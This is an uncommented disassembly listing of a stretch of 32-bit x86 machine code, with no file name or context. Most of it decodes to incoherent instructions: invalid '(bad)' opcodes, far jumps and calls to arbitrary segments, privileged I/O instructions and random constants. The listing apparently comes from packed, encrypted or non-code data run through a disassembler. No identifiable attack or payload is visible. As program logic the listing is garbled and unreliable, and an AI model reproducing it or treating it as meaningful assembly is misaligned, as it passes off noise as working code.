  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	pop    ds
  42fc8d:	push   ebp
  42fc8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc8f:	mov    ds:0x537a26f3,eax
  42fc94:	sbb    ebx,ecx
  42fc96:	gs and cl,bh
  42fc99:	mov    al,ds:0x208a993a
  42fc9e:	sar    DWORD PTR [edx-0x6e6f9ec8],1
  42fca4:	cmc    
  42fca5:	and    edx,DWORD PTR [ebp-0x314a6a39]
  42fcab:	push   0x41b91a89
  42fcb0:	loope  0x42fc82
  42fcb2:	js     0x42fcf3
  42fcb4:	(bad)  
  42fcb5:	mov    ebx,0x85cdcdcf
  42fcba:	jp     0x42fd16
  42fcbc:	inc    edx
  42fcbd:	push   edx
  42fcbe:	dec    ebx
  42fcbf:	loop   0x42fcb3
  42fcc1:	mov    eax,0x99a744ba
  42fcc6:	xor    BYTE PTR [eax+edx*1+0x4b],ah
  42fcca:	mov    eax,ds:0x2a0cbd9b
  42fccf:	push   esi
  42fcd0:	mov    edx,0xfd870499
  42fcd5:	adc    ebp,DWORD PTR [edi+eiz*4+0x4fc68668]
  42fcdc:	add    al,0x9c
  42fcde:	(bad)  
  42fce0:	test   BYTE PTR [edi+0x4514b75f],ch
  42fce6:	inc    eax
  42fce7:	pusha  
  42fce8:	jbe    0x42fd55
  42fcea:	mov    dl,0x1c
  42fcec:	retf   0x9f4a
  42fcef:	out    0x3e,eax
  42fcf1:	lock aas 
  42fcf3:	sub    bl,BYTE PTR [ecx+0x3eb76c7b]
  42fcf9:	loopne 0x42fcf3
  42fcfb:	rcr    DWORD PTR [eax],0xb2
  42fcfe:	dec    edx
  42fcff:	call   0xdecc:0x990f779e
  42fd06:	test   BYTE PTR [edi],cl
  42fd08:	xchg   BYTE PTR [ecx+0x8],ch
  42fd0b:	add    DWORD PTR [ebp-0x26],0xffffffc3
  42fd0f:	test   DWORD PTR [ecx-0x20],0xa0103bca
  42fd16:	imul   eax,DWORD PTR [ebp+0x64],0x88e8b9b
  42fd1d:	loop   0x42fd86
  42fd1f:	jbe    0x42fcbe
  42fd21:	or     eax,0x6a680210
  42fd26:	cld    
  42fd27:	popf   
  42fd28:	add    edx,DWORD PTR [edx+0x28]
  42fd2b:	imul   DWORD PTR [ebx+0x16573326]
  42fd31:	add    dl,ch
  42fd33:	xor    eax,0x520e490
  42fd38:	jns    0x42fd1e
  42fd3a:	(bad)
  42fd3e:	xor    DWORD PTR [edx-0x297cd796],ebx
  42fd44:	fs cmc 
  42fd46:	(bad)
  42fd49:	mov    ebp,0x5389ada4
  42fd4e:	adc    ebx,DWORD PTR [eax-0x3742f5cc]
  42fd54:	rol    BYTE PTR [eax-0x7886b58f],1
  42fd5a:	stos   DWORD PTR es:[edi],eax
  42fd5b:	mov    esp,0x46be9f68
  42fd60:	jecxz  0x42fdc1
  42fd62:	xchg   ecx,eax
  42fd63:	fistp  WORD PTR [esi+0x279cb4e0]
  42fd69:	or     BYTE PTR [edx-0x6ef6b910],0xb1
  42fd70:	cmp    dl,dl
  42fd72:	repnz mov cl,0xc1
  42fd75:	fisubr WORD PTR [edi+0x11]
  42fd78:	loop   0x42fdc1
  42fd7a:	ret    
  42fd7b:	mov    bh,0x94
  42fd7d:	adc    BYTE PTR ds:0xd8b9f399,0xe2
  42fd84:	out    dx,eax
  42fd85:	(bad)  
  42fd86:	repnz dec ebx
  42fd88:	adc    bl,bl
  42fd8a:	fiadd  DWORD PTR [ebx-0x5f]
  42fd8d:	sbb    BYTE PTR [esi-0x53],al
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz push ebx
  42fe01:	adc    bl,al
  42fe03:	inc    esp
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	inc    ecx
  42fe0d:	sbb    al,0xb3
  42fe0f:	dec    ebx
  42fe10:	push   0xd5e161cd
  42fe15:	shr    DWORD PTR es:[ecx],1
  42fe18:	inc    eax
  42fe19:	cmp    esi,ebp
  42fe1b:	repnz pop ebx
  42fe1d:	icebp  
  42fe1e:	test   DWORD PTR [edx],0x32691c7c
  42fe24:	sbb    DWORD PTR [edx],edi
  42fe26:	adc    eax,0x189826ec
  42fe2b:	and    BYTE PTR [ecx+0x4712495b],bh
  42fe31:	jbe    0x42fdbd
  42fe33:	cdq    
  42fe34:	fdiv   QWORD PTR [ebp-0x65402533]
  42fe3a:	jp     0x42fea8
  42fe3c:	ret    0xabc1
  42fe3f:	sbb    bl,BYTE PTR [edx]
  42fe41:	in     eax,dx
  42fe42:	push   edi
  42fe43:	clc    
  42fe44:	int    0x6b
  42fe46:	jmp    0x42fe4c
  42fe48:	loopne 0x42fe9e
  42fe4a:	mov    cl,0x4e
  42fe4c:	pusha  
  42fe4d:	test   eax,0x1b4e1439
  42fe52:	add    eax,0x77ac74f4
  42fe57:	rcr    DWORD PTR [ecx+ecx*1],cl
  42fe5a:	sahf   
  42fe5b:	cwde   
  42fe5c:	jmp    0x9222b432
  42fe61:	imul   ebx,DWORD PTR [ebx-0x4],0xab4d1e75
  42fe68:	pop    ss
  42fe69:	mov    ebx,0x7abfdac0
  42fe6e:	pop    eax
  42fe6f:	push   edi
  42fe70:	adc    eax,0x127643a0
  42fe75:	fstp   TBYTE PTR [edi-0x20]
  42fe78:	cmp    ch,BYTE PTR [ebp-0xf]
  42fe7b:	cmp    al,0x5d
  42fe7d:	les    esp,FWORD PTR [ecx+0x6e7aa8e0]
  42fe83:	sub    BYTE PTR [eax],ah
  42fe85:	es jp  0x42fe6d
  42fe88:	sti    
  42fe89:	aad    0xdc
  42fe8b:	xor    al,BYTE PTR [ecx+0x13]
  42fe8e:	imul   eax,edx,0x5e3cd1e6
  42fe94:	mov    ecx,DWORD PTR ds:0x9683dc8f
  42fe9a:	or     DWORD PTR [esi-0x7ea45457],ebx
  42fea0:	inc    edi
  42fea1:	add    ah,BYTE PTR [eax-0x7]
  42fea4:	xchg   esp,eax
  42fea5:	inc    esp
  42fea6:	ins    BYTE PTR es:[edi],dx
  42fea7:	or     eax,0x22862735
  42feac:	outs   dx,DWORD PTR ds:[esi]
  42fead:	mov    BYTE PTR [eax],dl
  42feaf:	mov    BYTE PTR [eax+eiz*4],ch
  42feb2:	sbb    DWORD PTR [esi-0x25],esp
  42feb5:	out    dx,eax
  42feb6:	inc    ebp
  42feb7:	stos   BYTE PTR es:[edi],al
  42feb8:	push   0xd00b8d7d
  42febd:	int3   
  42febe:	fs dec ebp
  42fec0:	xor    eax,0xdd6581eb
  42fec5:	xchg   BYTE PTR [eax+esi*1-0x53328437],dh
  42fecc:	inc    ebx
  42fecd:	int3   
  42fece:	out    0x67,al
  42fed0:	inc    edx
  42fed1:	leave  
  42fed2:	je     0x42feae
  42fed4:	mov    eax,ds:0x51faee73
  42fed9:	or     al,0xd2
  42fedb:	mov    esi,0x56bb6537
  42fee0:	xchg   ebx,eax
  42fee1:	sti    
  42fee2:	mov    BYTE PTR [ecx],dh
  42fee4:	pop    eax
  42fee5:	add    ah,cl
  42fee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fee8:	pop    ebx
  42fee9:	and    DWORD PTR [edi+0x23],ebx
  42feec:	jmp    0x7c1f:0x93ae57d5
  42fef3:	addr16 pop esi
  42fef5:	fwait
  42fef6:	jae    0x42ff5a
  42fef8:	push   ebx
  42fef9:	cmc    
  42fefa:	cmp    al,0x61
  42fefc:	push   esp
  42fefd:	adc    eax,DWORD PTR [eax-0x1e2fe5ee]
  42ff03:	in     eax,dx
  42ff04:	sub    cl,al
  42ff06:	pushf  
  42ff07:	cmp    eax,0xaf37e145
  42ff0c:	sbb    esp,DWORD PTR [eax]
  42ff0e:	pop    edi
  42ff0f:	inc    BYTE PTR [eax]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+eax*1+0x43],0xe0
  42ff83:	mov    ch,0x88
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    BYTE PTR [ecx+eax*1],al
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	adc    ah,ch
  42ff8e:	cmp    dh,cl
  42ff90:	sbb    eax,0xe4692112
  42ff95:	push   esi
  42ff96:	jl     0x42ff6a
  42ff98:	cmp    al,0x3d
  42ff9a:	bound  esp,QWORD PTR [esi-0x6f]
  42ff9d:	js     0x42ffe9
  42ff9f:	iret   
  42ffa0:	retf   0x8532
  42ffa3:	and    esp,DWORD PTR [ebx-0x6a]
  42ffa6:	cmp    edi,DWORD PTR [ebx-0x21]
  42ffa9:	adc    DWORD PTR [edi+0x65],eax
  42ffac:	xor    bl,BYTE PTR [esi+esi*2]
  42ffaf:	mov    edx,DWORD PTR [edx+0x22]
  42ffb2:	xchg   ecx,eax
  42ffb3:	pop    ds
  42ffb4:	cs jns 0x42ff95
  42ffb7:	push   ss
  42ffb8:	adc    bl,BYTE PTR [ebp+0x30]
  42ffbb:	inc    edx
  42ffbc:	nop
  42ffbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffbe:	push   es
  42ffbf:	xor    ebx,ebx
  42ffc1:	imul   ecx,ebp,0xffffffa9
  42ffc4:	add    al,0x62
  42ffc6:	xchg   ebx,eax
  42ffc7:	daa    
  42ffc8:	push   ds
  42ffc9:	add    ah,BYTE PTR [esi+0x5a]
  42ffcc:	sbb    DWORD PTR [ecx+0x3e],0x2252b693
  42ffd3:	jns    0x430017
  42ffd5:	cs (bad) 
  42ffd7:	in     al,0xd9
  42ffd9:	call   0xac92:0xcba98160
  42ffe0:	inc    eax
  42ffe1:	gs adc eax,0xa1f5854
  42ffe7:	ins    BYTE PTR es:[edi],dx
  42ffe8:	xchg   esp,eax
  42ffe9:	or     cl,ch
  42ffeb:	pop    esp
  42ffec:	mov    edi,DWORD PTR [edi]
  42ffee:	test   eax,0x47cd41e7
  42fff3:	int    0x87
  42fff5:	add    ecx,ebp
  42fff7:	into   
  42fff8:	sub    eax,0xe8b94b2a
  42fffd:	sub    bh,BYTE PTR [ebx-0x2e]
  430000:	test   al,0x61
  430002:	xor    eax,0x28320a2a
  430007:	popf   
  430008:	or     bh,BYTE PTR [eax]
  43000a:	inc    ebx
  43000b:	add    DWORD PTR [edi],esi
  43000d:	outs   dx,DWORD PTR ds:[esi]
  43000e:	arpl   sp,cx
  430010:	daa    
  430011:	ret    
  430012:	lea    ebx,[eax-0x30208e6]
  430018:	mov    eax,0x25386183
  43001d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43001e:	mov    dl,0xa3
  430020:	lds    edi,FWORD PTR [edx+0x65]
  430023:	inc    edi
  430024:	pop    es
  430025:	or     cl,0xe
  430028:	enter  0x29b7,0x10
  43002c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43002d:	pop    edx
  43002e:	rcl    ch,cl
  430030:	dec    eax
  430031:	(bad)  
  430033:	stos   BYTE PTR es:[edi],al
  430034:	adc    BYTE PTR [edi+0x4c],ah
  430037:	lods   eax,DWORD PTR ds:[esi]
  430038:	loopne 0x430060
  43003a:	push   0xaf9b93b6
  43003f:	add    bh,dl
  430041:	sub    ebx,eax
  430043:	fs dec ecx
  430045:	pop    eax
  430046:	inc    ecx
  430047:	mov    ch,0x60
  430049:	ins    DWORD PTR es:[edi],dx
  43004a:	stos   BYTE PTR es:[edi],al
  43004b:	mov    WORD PTR [ebx],ds
  43004d:	xchg   ebp,eax
  43004e:	sbb    al,0xcf
  430050:	inc    ecx
  430051:	mov    al,0x91
  430053:	jno    0x430094
  430055:	cli    
  430056:	push   esi
  430057:	sbb    DWORD PTR [ebp-0x2e697358],edi
  43005d:	fs xchg edi,eax
  43005f:	outs   dx,BYTE PTR ds:[esi]
  430060:	idiv   BYTE PTR [ebx-0x4203bf02]
  430066:	inc    ebx
  430067:	cli    
  430068:	enter  0x4701,0xaa
  43006c:	pop    ss
  43006d:	call   edx
  43006f:	xlat   BYTE PTR ds:[ebx]
  430070:	xor    BYTE PTR [ecx-0x50],dh
  430073:	or     al,al
  430075:	add    esi,DWORD PTR [ebx+0x1344a0e5]
  43007b:	aas    
  43007c:	imul   BYTE PTR [esp+eax*8]
  43007f:	leave  
  430080:	jp     0x43003c
  430082:	outs   dx,BYTE PTR ds:[esi]
  430083:	js     0x430075
  430085:	push   cs
  430086:	pop    esp
  430087:	fidivr DWORD PTR [edi]
  430089:	pop    ds
  43008a:	mov    edx,0x8eb25a3b
  43008f:	loope  0x430091
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    bh,al
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x17
  430101:	or     al,0x33
  430103:	or     DWORD PTR [edx+eax*1+0x920002],0xadc20000
  43010e:	sbb    ebx,eax
  430110:	addr16 out 0xae,al
  430113:	xchg   esp,eax
  430114:	(bad)  
  430115:	(bad)  
  430116:	int3   
  430117:	pushf  
  430118:	xchg   esp,eax
  430119:	sbb    BYTE PTR [edx+0xd],cl
  43011c:	inc    esi
  43011d:	data16 outs dx,BYTE PTR ds:[esi]
  43011f:	or     edx,DWORD PTR cs:[edi]
  430122:	ja     0x4300ee
  430124:	jne    0x43015b
  430126:	ins    DWORD PTR es:[edi],dx
  430127:	loope  0x43016e
  430129:	outs   dx,BYTE PTR ds:[esi]
  43012a:	add    bh,BYTE PTR [edi]
  43012c:	sahf   
  43012d:	lea    eax,ds:0x54614795
  430133:	inc    ebx
  430134:	mov    ds:0x92842288,eax
  430139:	in     eax,dx
  43013a:	push   0x34
  43013c:	cmovae ecx,DWORD PTR [edi+0x75]
  430140:	cmp    eax,0x42e98117
  430145:	dec    eax
  430146:	or     BYTE PTR [ecx],bl
  430148:	jmp    0xdb639135
  43014d:	stos   DWORD PTR es:[edi],eax
  43014e:	pop    es
  43014f:	in     eax,0x5b
  430151:	lds    ebp,FWORD PTR [ebx]
  430153:	mov    dl,0x30
  430155:	xlat   BYTE PTR ds:[ebx]
  430156:	fidivr WORD PTR [ebp+esi*4+0x29be9af7]
  43015d:	pop    ds
  43015e:	and    al,dl
  430160:	stos   DWORD PTR es:[edi],eax
  430161:	mov    ch,0xef
  430163:	dec    esi
  430164:	sahf   
  430165:	add    eax,0xa3e540aa
  43016a:	mov    ah,0x80
  43016c:	pop    ecx
  43016d:	mov    bl,0x53
  43016f:	sbb    BYTE PTR [eax+0x1b],bh
  430172:	test   BYTE PTR [ebx],0x1a
  430175:	push   eax
  430176:	cmp    bl,cl
  430178:	rcr    BYTE PTR [edi+0x61],cl
  43017b:	dec    ecx
  43017c:	ins    DWORD PTR es:[edi],dx
  43017d:	imul   esi,DWORD PTR [edx-0x323f4092],0x9071ee29
  430187:	cld    
  430188:	adc    edx,DWORD PTR [eax]
  43018a:	add    ecx,DWORD PTR ds:0x8b946cd6
  430190:	cdq    
  430191:	mov    ebx,cs
  430193:	(bad)  
  430194:	fcmovnb st,st(1)
  430196:	sar    BYTE PTR [ebx],1
  430198:	cmc    
  430199:	neg    ebx
  43019b:	nop
  43019c:	in     eax,0xce
	...
  4301f2:	add    BYTE PTR [eax],al
  4301f4:	dec    ebp
  4301f5:	push   ebp
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
